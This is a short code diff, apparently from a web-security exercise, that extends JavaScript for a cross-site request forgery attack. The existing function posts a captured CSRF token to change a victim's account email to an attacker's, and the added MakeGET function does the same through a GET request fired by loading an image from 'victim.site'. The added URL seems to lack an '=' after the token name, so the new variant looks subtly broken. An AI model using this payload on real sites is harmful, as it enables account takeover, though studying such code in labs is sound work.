@@ -27,3 +27,12 @@ function XHRPost(tokenID){
 	var params= "old=myoldemail&confirm=1&new=attackerEmail&csrfToken="+ tokenID;
 	http.send(params);
 }
+
+//funcion para hacerlo con GET y una imagen
+function MakeGET(tokenID){
+	var url= "http://victim.site/csrf/change.php?";
+	url+=    "old=myoldemail&confirm=1&";
+	url+=    "new=attackermail&csrfToken"+ tokenID;
+	
+	new Image().src = url; //GET Req
+}
